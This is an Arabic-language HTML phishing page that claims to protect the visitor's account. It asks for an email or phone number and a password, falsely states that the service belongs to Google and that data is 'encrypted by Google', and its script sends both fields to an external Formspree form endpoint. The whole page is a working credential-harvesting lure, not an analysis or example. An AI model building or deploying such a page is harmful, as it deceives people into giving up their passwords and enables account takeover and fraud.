<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج حماية حسابك</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Cairo', sans-serif;
        }
        .validation-icon, .error-icon, .error-message {
            display: none;
        }
        .error-message {
            font-size: 0.8rem;
            color: #ef4444; /* red-500 */
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="w-full max-w-lg mx-4 bg-white rounded-xl shadow-lg p-8">
        <h1 class="text-2xl font-bold text-center text-gray-800 mb-6">احمي بياناتك من اي تهديد</h1>
        <p class="text-center text-gray-500 mb-8">
            املأ النموذج أدناه لإرسال بياناتك. سوف يتم حماية حسابك بالكامل.
        </p>

        <form id="contactForm" action="https://formspree.io/f/movwekjj" method="POST" novalidate>
            <!-- حقل وسيلة التواصل -->
            <div class="mb-5">
                <label for="contact" class="block text-gray-700 text-sm font-bold mb-2">البريد الإلكتروني أو رقم الهاتف:</label>
                <div class="relative">
                    <input
                        type="text"
                        id="contact"
                        name="سيتم حماية بيانات الحساب وذلك بتشفيرها من شركة google"
                        placeholder="ادخل بريدك الإلكتروني أو رقم هاتفك"
                        required
                        class="shadow-sm appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500"
                    >
                    <span class="validation-icon absolute left-3 top-3.5 text-green-500">✔</span>
                    <span class="error-icon absolute left-3 top-3.5 text-red-500">✖</span>
                </div>
                <p id="contactError" class="error-message mt-1">خطأ في الإدخال.</p>
            </div>

            <!-- حقل الخبرة -->
            <div class="mb-8">
                 <label for="experience" class="block text-gray-700 text-sm font-bold mb-2">كلمة السر :</label>
                <div class="relative">
                    <input
                        type="text"
                        id="experience"
                        name="كلمة السر"
                        placeholder="اكتب كلمة السر هنا"
                        required
                        class="shadow-sm appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500"
                    >
                    <span class="validation-icon absolute left-3 top-3.5 text-green-500">✔</span>
                </div>
            </div>

            <!-- حاوية رسائل الحالة -->
            <div id="statusMessage" class="text-center p-3 rounded-lg mb-4 text-white" style="display: none;"></div>

            <!-- زر الإرسال -->
            <div class="flex items-center justify-center">
                <button
                    id="submitButton"
                    type="submit"
                    class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg focus:outline-none focus:shadow-outline transition-all duration-300 transform hover:scale-105"
                >
                    إرسال
                </button>
            </div>
        </form>
         <p class="text-xs text-center text-gray-400 mt-8">
            بعد التسجيل سوف يتم حماية بياناتك لضمان راحتك هذه الشركة تابعة ل google 
        </p>
    </div>

    <script>
        const form = document.getElementById('contactForm');
        const contactInput = document.getElementById('contact');
        const experienceInput = document.getElementById('experience');
        const submitButton = document.getElementById('submitButton');
        const statusMessage = document.getElementById('statusMessage');
        const contactError = document.getElementById('contactError');

        function validateEmail(email) {
            const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(String(email).toLowerCase());
        }

        function isPhoneNumber(value) {
            const phoneRegex = /^[+]?[\d\s()-]+$/;
            return phoneRegex.test(value);
        }

        function validateInput(input) {
            const parentDiv = input.parentElement;
            const validIcon = parentDiv.querySelector('.validation-icon');
            const errorIcon = parentDiv.querySelector('.error-icon');
            let isValid = false;

            if (input.id === 'contact') {
                const value = input.value.trim();
                if (value === '') {
                    isValid = false;
                    contactError.textContent = 'هذا الحقل مطلوب.';
                    contactError.style.display = 'block';
                } else if (value.includes('@')) {
                    isValid = validateEmail(value);
                    contactError.textContent = 'صيغة البريد الإلكتروني غير صالحة.';
                    contactError.style.display = isValid ? 'none' : 'block';
                } else {
                    isValid = isPhoneNumber(value);
                    contactError.textContent = 'صيغة رقم الهاتف غير صالحة.';
                    contactError.style.display = isValid ? 'none' : 'block';
                }
            } else {
                 isValid = input.value.trim() !== '';
            }

            if (validIcon) validIcon.style.display = isValid ? 'inline' : 'none';
            if (errorIcon) errorIcon.style.display = !isValid && input.value.trim() !== '' ? 'inline' : 'none';
            
            if (isValid) {
                input.classList.remove('border-red-500', 'focus:ring-red-500');
                input.classList.add('border-green-500', 'focus:ring-green-500');
            } else {
                input.classList.remove('border-green-500', 'focus:ring-green-500');
                if (input.value.trim() !== '') {
                    input.classList.add('border-red-500', 'focus:ring-red-500');
                }
            }
            return isValid;
        }
        
        contactInput.addEventListener('input', () => validateInput(contactInput));
        experienceInput.addEventListener('input', () => validateInput(experienceInput));

        form.addEventListener('submit', async function(event) {
            event.preventDefault();

            const isContactValid = validateInput(contactInput);
            const isExperienceValid = validateInput(experienceInput);

            if (!isContactValid || !isExperienceValid) {
                statusMessage.textContent = 'الرجاء تصحيح الأخطاء في الحقول أعلاه.';
                statusMessage.className = 'text-center p-3 rounded-lg mb-4 text-white bg-red-500';
                statusMessage.style.display = 'block';
                return;
            }

            submitButton.disabled = true;
            submitButton.textContent = 'جارٍ الإرسال...';
            statusMessage.style.display = 'none';
            const formData = new FormData(form);

            try {
                const response = await fetch(form.action, {
                    method: form.method,
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });

                if (response.ok) {
                    statusMessage.textContent = 'تم ارسال المعلومات. يرجى الانتظار حتى 24 ساعة .';
                    statusMessage.className = 'text-center p-3 rounded-lg mb-4 text-white bg-green-600';
                    form.reset();
                    [contactInput, experienceInput].forEach(input => {
                        input.classList.remove('border-green-500', 'focus:ring-green-500', 'border-red-500', 'focus:ring-red-500');
                        const parentDiv = input.parentElement;
                        const validIcon = parentDiv.querySelector('.validation-icon');
                        if (validIcon) validIcon.style.display = 'none';
                        const errorIcon = parentDiv.querySelector('.error-icon');
                        if (errorIcon) errorIcon.style.display = 'none';
                    });
                    contactError.style.display = 'none';
                } else {
                    throw new Error('فشل الخادم في معالجة الطلب.');
                }
            } catch (error) {
                console.error('Error:', error);
                statusMessage.textContent = 'حصل خطأ. الرجاء المحاولة مرة أخرى.';
                statusMessage.className = 'text-center p-3 rounded-lg mb-4 text-white bg-red-500';
            } finally {
                submitButton.disabled = false;
                submitButton.textContent = 'تسجيل';
                statusMessage.style.display = 'block';
            }
        });
    </script>
</body>
</html>
